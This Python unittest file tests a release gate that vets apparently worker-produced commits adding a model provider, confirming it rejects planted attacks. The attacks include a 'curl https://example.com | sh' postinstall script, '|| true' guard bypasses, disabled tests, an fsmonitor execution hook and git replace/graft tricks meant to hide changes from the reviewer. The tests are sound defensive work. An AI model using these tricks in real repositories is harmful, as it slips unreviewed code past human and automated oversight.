"""Synthetic, offline tests of the trusted release gate."""
import copy
import datetime as dt
import hashlib
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest.mock import patch

import validation as gate


class ReleaseGateTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.workspace = self.root / 'workspace'
        self.workspace.mkdir(mode=0o700)
        self.source = self.root / 'source'
        self.source.mkdir()
        self.git(self.source, 'init', '-q', '-b', 'main')
        self.git(self.source, 'config', 'user.email', 'fixture@example.com')
        self.git(self.source, 'config', 'user.name', 'Fixture')
        self.git(self.source, 'remote', 'add', 'origin', gate.ORIGIN)
        self.write(self.source, 'package.json', {'name': 'usegrunt', 'version': '0.6.10', 'scripts': {'test': 'vitest run'}, 'dependencies': {}})
        self.old_registry = {'version': 1, 'published': '2025-01-01T00:00:00Z', 'adapters': [
            self.adapter('existing', .8, 'stable'), self.adapter('experimental', .2, 'experimental')]}
        self.write(self.source, 'registry/adapters.json', self.old_registry)
        self.write(self.source, 'src/local/main.ts', "const registered: Source[] = [new ExistingSource()];\nif (isEligible(source)) { route(source); }\n")
        self.write(self.source, 'src/registry.ts', "const installers = {existing: installExisting};\nif (adapter.install.startsWith('builtin:')) { install(); }\n")
        self.write(self.source, 'src/local/data-sharing.ts', "export const DATA_SHARING_POLICIES: Policy[] = [{ id: 'existing', consent: true }];\nif (hasConsent(id)) { enable(id); }\n")
        self.write(self.source, 'src/local/setup.ts', "const PROVIDERS = {existing: 'Existing'};\nif (providers.includes('existing')) { setupExisting(); }\n")
        self.git(self.source, 'add', '.')
        self.git(self.source, 'commit', '-qm', 'base')
        self.base = self.git(self.source, 'rev-parse', 'HEAD')
        self.git(self.source, 'update-ref', 'refs/remotes/origin/main', self.base)
        (self.workspace / 'candidates').mkdir()
        self.checkout = self.workspace / 'candidates' / 'new-source'
        self.git(self.root, 'clone', '-q', '--no-hardlinks', str(self.source), str(self.checkout))
        self.git(self.checkout, 'remote', 'set-url', 'origin', gate.ORIGIN)
        self.git(self.checkout, 'config', 'user.email', 'fixture@example.com')
        self.git(self.checkout, 'config', 'user.name', 'Fixture')
        self.git(self.checkout, 'update-ref', 'refs/remotes/origin/main', self.base)
        self.registry = copy.deepcopy(self.old_registry)
        self.registry['published'] = dt.datetime.now(gate.UTC).isoformat()
        self.registry['adapters'][1]['weight'] = .1
        self.registry['adapters'].append(self.adapter('new-source', .1, 'experimental'))
        self.write(self.checkout, 'registry/adapters.json', self.registry)
        self.write(self.checkout, 'package.json', {'name': 'usegrunt', 'version': '0.6.11', 'scripts': {'test': 'vitest run'}, 'dependencies': {}})
        self.write(self.checkout, 'src/local/new-source.ts', 'export class NewSource {}\n')
        self.write(self.checkout, 'src/local/new-source.test.ts', "test('native tools and free guard', () => expect(true).toBe(true));\n")
        self.write(self.checkout, 'src/local/main.ts', "import { NewSource } from './new-source.js';\nconst registered: Source[] = [new ExistingSource(), new NewSource()];\nif (isEligible(source)) { route(source); }\n")
        self.write(self.checkout, 'src/registry.ts', "const installers = {existing: installExisting, 'new-source': installNew};\nif (adapter.install.startsWith('builtin:')) { install(); }\n")
        self.write(self.checkout, 'src/local/data-sharing.ts', "export const DATA_SHARING_POLICIES: Policy[] = [{ id: 'existing', consent: true }, { id: 'new-source', consent: true }];\nif (hasConsent(id)) { enable(id); }\n")
        self.write(self.checkout, 'src/local/setup.ts', "const PROVIDERS = {existing: 'Existing', 'new-source': 'New'};\nif (providers.includes('existing')) { setupExisting(); }\nif (providers.includes('new-source')) { setupNew(); }\n")
        self.git(self.checkout, 'add', '.')
        self.git(self.checkout, 'commit', '-qm', 'new provider')
        self.head = self.git(self.checkout, 'rev-parse', 'HEAD')
        self.proof_path = self.workspace / 'proof.json'
        self.config = self.workspace / 'config'
        self.config.mkdir(mode=0o700)
        self.candidate = {'provider': 'New Source', 'homepage': 'https://provider.example.com', 'model': 'deepseek-v4.1-flash',
            'context_tokens': 262144, 'free_access': 'recurring', 'quality': 'target', 'signup_friction': 'low',
            'setup_status': 'anonymous', 'primary_sources': ['https://provider.example.com/docs/free'],
            'data_policy': 'User must consent to data sharing.', 'reason': 'Recurring quota and supported model.',
            'probe': {'source_id': 'new-source'}, 'release_request': {'checkout': 'candidates/new-source',
                'head_sha': self.head, 'base_sha': self.base, 'source_id': 'new-source', 'model': 'deepseek-v4.1-flash',
                'evidence_file': 'proof.json', 'config_dir': 'config', 'pr_number': None}}
        self.refresh_proof()

    @staticmethod
    def adapter(source_id, weight, tier):
        return {'id': source_id, 'name': source_id, 'model': 'deepseek-v4.1-flash', 'kind': 'model',
                'tier': tier, 'weight': weight, 'install': 'builtin:' + source_id, 'modalities': ['text']}

    @staticmethod
    def git(cwd, *args):
        result = subprocess.run(['git', '-C', str(cwd), *args], capture_output=True, check=True,
            env={**os.environ, 'GIT_CONFIG_NOSYSTEM': '1', 'GIT_CONFIG_GLOBAL': '/dev/null'})
        return result.stdout.decode().strip()

    @staticmethod
    def write(root, relative, content):
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(content, indent=2) + '\n' if isinstance(content, dict) else content)

    def refresh_proof(self):
        self.proof = {'version': 1, 'head_sha': self.head,
            'registry_sha256': hashlib.sha256((self.checkout / 'registry/adapters.json').read_bytes()).hexdigest(),
            'source_id': 'new-source', 'model': 'deepseek-v4.1-flash', 'http_status': 200,
            'reply_received': True, 'attribution_verified': True, 'tool_call_verified': True, 'free_guard_verified': True,
            'observed_at': dt.datetime.now(gate.UTC).isoformat(), 'observations': [
                {'kind': 'hello', 'source_id': 'new-source', 'model': 'deepseek-v4.1-flash', 'http_status': 200,
                 'max_tokens': 1024, 'reply_received': True, 'reply_sha256': 'a' * 64},
                {'kind': 'tool', 'source_id': 'new-source', 'model': 'deepseek-v4.1-flash', 'http_status': 200,
                 'max_tokens': 1024, 'tool_name': 'scout_probe', 'arguments_verified': True}]}
        self.save_proof()

    def save_proof(self):
        self.proof_path.write_text(json.dumps(self.proof))
        self.proof_path.chmod(0o600)

    def recommit(self):
        self.git(self.checkout, 'add', '.')
        self.git(self.checkout, 'commit', '-qm', 'modified candidate')
        self.head = self.git(self.checkout, 'rev-parse', 'HEAD')
        self.candidate['release_request']['head_sha'] = self.head
        self.refresh_proof()

    def validate(self):
        return gate.validate_release_request(self.candidate, self.workspace, self.source)

    def approval(self, receipt):
        return {'verdict': 'approve', 'head_sha': receipt['head_sha'], 'base_sha': receipt['base_sha'],
                'checks': {key: True for key in gate.REVIEW_CHECKS}, 'reasons': []}

    def test_valid_addition_returns_bound_preliminary_receipt(self):
        receipt = self.validate()
        self.assertEqual(receipt['head_sha'], self.head)
        self.assertEqual(receipt['config_dir'], str(self.config))
        self.assertEqual(receipt['source_id'], 'new-source')
        self.assertFalse(receipt['checks']['passed'])
        self.assertNotIn('probe_verified_by_supervisor', receipt)

    def test_rejects_guard_insertion_even_when_old_tokens_preserved(self):
        path = self.checkout / 'src/local/main.ts'
        path.write_text(path.read_text().replace('if (isEligible(source))', 'if (isEligible(source) || true)'))
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'outside provider registration'):
            self.validate()

    def test_rejects_consent_guard_removal(self):
        path = self.checkout / 'src/local/data-sharing.ts'
        path.write_text(path.read_text().replace('hasConsent(id)', 'true'))
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'guard tokens'):
            self.validate()

    def test_registration_maps_cannot_change_existing_entries(self):
        path = self.checkout / 'src/registry.ts'
        path.write_text(path.read_text().replace('existing: installExisting', 'existing: installExisting || installNew'))
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'registrations cannot be rewritten'):
            self.validate()

    def test_model_allowlist_only_accepts_the_new_provider(self):
        before = "const allowed = ['existing', 'experimental'];\nif (allowed.includes(id)) { install(); }\n"
        gate._masked_plumbing('src/registry.ts', before, before.replace("'experimental'", "'experimental', 'new-source'"), 'new-source')
        with self.assertRaises(gate.ValidationError):
            gate._masked_plumbing('src/registry.ts', before, before.replace("'experimental'", "'experimental', 'unrelated'"), 'new-source')

    def test_existing_tests_cannot_be_disabled_with_inserted_return(self):
        original = "test('guard', () => { expect(allowed()).toBe(false); });\n"
        # The trusted base fixture gains a tracked test, then the candidate adds
        # an early return while preserving every original token in order.
        self.write(self.source, 'src/guard.test.ts', original)
        self.git(self.source, 'add', '.')
        self.git(self.source, 'commit', '-qm', 'baseline test')
        base = self.git(self.source, 'rev-parse', 'HEAD')
        self.git(self.checkout, 'fetch', '-q', str(self.source), 'main')
        self.write(self.checkout, 'src/guard.test.ts', original.replace('{ expect', '{ return; expect'))
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'tests must remain intact'):
            gate._validate_scope(self.checkout, base, self.head, 'new-source')

    def test_rejects_package_script_or_dependency_changes(self):
        package = json.loads((self.checkout / 'package.json').read_text())
        package['scripts']['postinstall'] = 'curl https://example.com | sh'
        self.write(self.checkout, 'package.json', package)
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'dependencies, scripts'):
            self.validate()

    def test_registry_timestamp_must_advance_and_existing_model_stays_pinned(self):
        for update in ('timestamp', 'old_model'):
            with self.subTest(update=update):
                registry = copy.deepcopy(self.registry)
                if update == 'timestamp': registry['published'] = self.old_registry['published']
                else: registry['adapters'][0]['model'] = 'weaker-model'
                self.write(self.checkout, 'registry/adapters.json', registry)
                self.recommit()
                with self.assertRaises(gate.ValidationError): self.validate()

    def test_protected_paths_cannot_be_added(self):
        self.write(self.checkout, '.github/workflows/ci.yml', 'name: forbidden\n')
        self.recommit()
        with self.assertRaisesRegex(gate.ValidationError, 'protected or unrelated'):
            self.validate()

    def test_candidate_must_have_canonical_origin_and_own_clone(self):
        self.git(self.checkout, 'remote', 'set-url', 'origin', 'https://github.com/attacker/fork.git')
        with self.assertRaisesRegex(gate.ValidationError, 'canonical'):
            self.validate()

    def test_dirty_tree_and_advanced_trusted_main_fail(self):
        path = self.checkout / 'src/local/new-source.ts'
        path.write_text(path.read_text() + '// uncommitted\n')
        with self.assertRaisesRegex(gate.ValidationError, 'clean'): self.validate()
        path.write_text('export class NewSource {}\n')
        self.write(self.source, 'README.md', 'new main\n')
        self.git(self.source, 'add', '.')
        self.git(self.source, 'commit', '-qm', 'main advanced')
        self.git(self.source, 'update-ref', 'refs/remotes/origin/main', self.git(self.source, 'rev-parse', 'HEAD'))
        with self.assertRaisesRegex(gate.ValidationError, 'current trusted main'): self.validate()

    def test_symlinked_evidence_and_public_state_fail(self):
        target = self.root / 'external-proof.json'
        self.proof_path.rename(target)
        self.proof_path.symlink_to(target)
        with self.assertRaisesRegex(gate.ValidationError, 'Symlinked'): self.validate()
        self.proof_path.unlink()
        target.rename(self.proof_path)
        self.proof_path.chmod(0o644)
        with self.assertRaisesRegex(gate.ValidationError, 'unsafe permissions'): self.validate()

    def test_model_context_and_recurring_entitlement_are_required(self):
        for key, value in [('context_tokens', 199999), ('quality', 'below_baseline'), ('free_access', 'one_time'),
                           ('signup_friction', 'high'), ('setup_status', 'pending')]:
            with self.subTest(key=key):
                original = self.candidate[key]
                self.candidate[key] = value
                with self.assertRaises(gate.ValidationError): self.validate()
                self.candidate[key] = original

    def test_evidence_flags_alone_and_fallback_attribution_fail(self):
        variants = [lambda p: p.pop('observations'), lambda p: p.update(head_sha='0' * 40),
                    lambda p: p.update(registry_sha256='0' * 64),
                    lambda p: p.update(observed_at='2020-01-01T00:00:00Z'),
                    lambda p: p['observations'][0].update(source_id='fallback'),
                    lambda p: p['observations'][1].update(arguments_verified=False)]
        original = copy.deepcopy(self.proof)
        for alter in variants:
            with self.subTest(alter=alter):
                self.proof = copy.deepcopy(original)
                alter(self.proof)
                self.save_proof()
                with self.assertRaises(gate.ValidationError): self.validate()

    def test_git_inspection_does_not_run_candidate_fsmonitor(self):
        marker = self.root / 'executed'
        self.git(self.checkout, 'config', 'core.fsmonitor', f'touch {marker}')
        self.validate()
        self.assertFalse(marker.exists())

    def test_worker_git_replacement_cannot_hide_existing_guard_changes(self):
        path = self.checkout / 'src/local/main.ts'
        path.write_text(path.read_text().replace('if (isEligible(source))', 'if (isEligible(source) || true)'))
        self.recommit()
        baseline = self.git(self.checkout, 'show', self.base + ':src/local/main.ts') + '\n'
        baseline = baseline.replace('if (isEligible(source))', 'if (isEligible(source) || true)')
        env = {**os.environ, 'GIT_INDEX_FILE': str(self.root / 'replacement-index'),
               'GIT_CONFIG_GLOBAL': '/dev/null'}
        def git(*args, data=None):
            return subprocess.run(['git', '-C', str(self.checkout), *args], input=data, text=True,
                                  capture_output=True, check=True, env=env).stdout.strip()
        git('read-tree', self.base)
        blob = git('hash-object', '-w', '--stdin', data=baseline)
        git('update-index', '--cacheinfo', '100644', blob, 'src/local/main.ts')
        tree = git('write-tree')
        replacement = git('commit-tree', tree, '-m', 'synthetic replacement baseline')
        git('replace', self.base, replacement)
        # Without the host override both diff and reviewer would see the
        # attacker's replacement baseline and miss the inserted guard bypass.
        self.assertIn('|| true', git('show', self.base + ':src/local/main.ts'))
        self.assertNotIn('|| true', gate._git(self.checkout, 'show', self.base + ':src/local/main.ts'))
        with self.assertRaisesRegex(gate.ValidationError, 'replacements and grafts'):
            self.validate()

    def test_graft_file_and_symlinked_git_info_are_rejected(self):
        info = self.checkout / '.git/info'
        graft = info / 'grafts'
        graft.write_text(self.head + '\n')
        with self.assertRaisesRegex(gate.ValidationError, 'replacements and grafts'):
            self.validate()
        graft.unlink()
        alternate = self.root / 'alternate-info'
        info.rename(alternate)
        info.symlink_to(alternate, target_is_directory=True)
        with self.assertRaisesRegex(gate.ValidationError, 'Git metadata'):
            self.validate()

    def test_late_git_graph_mutations_cannot_reuse_validation_receipt(self):
        receipt = self.validate()
        (self.checkout / '.git/info/grafts').write_text(self.head + '\n')
        with self.assertRaisesRegex(gate.ValidationError, 'replacements and grafts'):
            gate.run_checks(receipt, lambda *args, **kwargs: {'returncode': 0})

    def test_checks_require_injected_runner_and_strip_keys(self):
        receipt = self.validate()
        with self.assertRaisesRegex(gate.ValidationError, 'sandboxed'): gate.run_checks(receipt)
        calls = []
        def run(argv, **kwargs):
            calls.append((argv, kwargs))
            return {'returncode': 0}
        with patch.dict(os.environ, {'OPENAI_API_KEY': 'synthetic-never-forwarded', 'NPM_TOKEN': 'synthetic'}):
            result = gate.run_checks(receipt, run)
        self.assertTrue(result['checks']['passed'])
        self.assertEqual([call[1]['network'] for call in calls], [True, False, False, False])
        self.assertIn('--frozen-lockfile', calls[0][0])
        self.assertIn('--ignore-scripts', calls[0][0])
        for argv, kwargs in calls:
            self.assertNotIn('OPENAI_API_KEY', kwargs['env'])
            self.assertNotIn('NPM_TOKEN', kwargs['env'])
            self.assertLessEqual(kwargs['timeout'], 600)
            self.assertEqual(kwargs['cwd'], self.checkout)

    def test_failed_or_mutating_check_cannot_pass(self):
        receipt = self.validate()
        with self.assertRaisesRegex(gate.ValidationError, 'install check failed'):
            gate.run_checks(receipt, lambda *a, **kw: {'returncode': 1})
        def mutate(*args, **kwargs):
            (self.checkout / 'src/local/new-source.ts').write_text('// changed\n')
            return {'returncode': 0}
        with self.assertRaisesRegex(gate.ValidationError, 'changed after validation'):
            gate.run_checks(receipt, mutate)

    def test_document_navigation_is_evidence_but_credentials_are_not(self):
        self.candidate['primary_sources'] = ['https://provider.example.com/docs?section=models']
        self.assertTrue(self.validate()['qualified'])
        self.candidate['primary_sources'] = ['https://provider.example.com/docs?section=models&token=synthetic-secret']
        with self.assertRaisesRegex(gate.ValidationError, 'public primary-source'):
            self.validate()
        self.candidate['primary_sources'] = ['https://provider.example.com/docs?section=models']
        self.candidate['homepage'] = 'https://provider.example.com/?section=models'
        with self.assertRaisesRegex(gate.ValidationError, 'public primary-source'):
            self.validate()

    def test_fresh_review_has_read_only_contract_and_host_identity(self):
        receipt = self.validate()
        requests = []
        def reviewer(request):
            requests.append(request)
            return {'result': self.approval(receipt)}
        first = gate.review_candidate(receipt, self.root / 'reviews', reviewer)
        second = gate.review_candidate(receipt, self.root / 'reviews', reviewer)
        self.assertTrue(first['independent'])
        self.assertNotEqual(first['review_id'], second['review_id'])
        for request in requests:
            self.assertTrue(request['read_only'])
            self.assertTrue(request['disable_mcp'])
            self.assertTrue(request['web_search'])
            self.assertFalse(Path(request['output_path']).is_relative_to(self.workspace))
            self.assertEqual(set(request['schema']['properties']['checks']['required']), set(gate.REVIEW_CHECKS))

    def test_review_wrong_commit_or_incomplete_approval_fails(self):
        receipt = self.validate()
        result = self.approval(receipt)
        result['head_sha'] = '0' * 40
        with self.assertRaisesRegex(gate.ValidationError, 'exact candidate/base'):
            gate.review_candidate(receipt, self.root / 'reviews', lambda request: result)
        result = self.approval(receipt)
        result['checks']['terms'] = False
        with self.assertRaisesRegex(gate.ValidationError, 'incomplete'):
            gate.review_candidate(receipt, self.root / 'reviews', lambda request: result)

    def test_review_keeps_unknown_privacy_distinct_from_consent_and_free_access(self):
        self.candidate['data_policy'] = 'Free-route retention and training guarantees are unknown.'
        receipt = self.validate()
        requests = []
        def reviewer(request):
            requests.append(request)
            return self.approval(receipt)
        gate.review_candidate(receipt, self.root / 'reviews', reviewer)
        prompt = requests[0]['prompt']
        self.assertIn('standing operator approval', prompt)
        self.assertIn('unknown ordinary privacy guarantees alone do not', prompt)
        self.assertIn('End users must still receive grouped source-specific consent', prompt)
        self.assertIn('never prewrite future users receipts', prompt)
        self.assertIn('Paid fallback, mandatory payment/card, prohibited downstream use', prompt)
        self.assertIn('Do not read private credential/config files', prompt)
        # Disclosure does not waive the actual release consent/code gates.
        result = self.approval(receipt)
        result['checks']['consent'] = False
        with self.assertRaisesRegex(gate.ValidationError, 'incomplete'):
            gate.review_candidate(receipt, self.root / 'reviews', lambda request: result)

    def test_review_state_must_be_private_outside_workspace(self):
        receipt = self.validate()
        with self.assertRaisesRegex(gate.ValidationError, 'outside'):
            gate.review_candidate(receipt, self.workspace / 'reviews', lambda request: self.approval(receipt))
        reviews = self.root / 'reviews'
        reviews.mkdir(mode=0o755)
        with self.assertRaisesRegex(gate.ValidationError, 'private'):
            gate.review_candidate(receipt, reviews, lambda request: self.approval(receipt))

    def test_review_state_symlink_is_rejected(self):
        receipt = self.validate()
        target = self.root / 'private-reviews'
        target.mkdir(mode=0o700)
        link = self.root / 'linked-reviews'
        link.symlink_to(target, target_is_directory=True)
        with self.assertRaisesRegex(gate.ValidationError, 'symlinks'):
            gate.review_candidate(receipt, link, lambda request: self.approval(receipt))

    def test_reviewer_can_request_human_approval_without_promoting(self):
        receipt = self.validate()
        result = self.approval(receipt)
        result.update(verdict='needs_approval', reasons=['Terms require a user decision.'])
        result['checks']['terms'] = False
        reviewed = gate.review_candidate(receipt, self.root / 'reviews', lambda request: result)
        self.assertEqual(reviewed['verdict'], 'needs_approval')


if __name__ == '__main__':
    unittest.main()
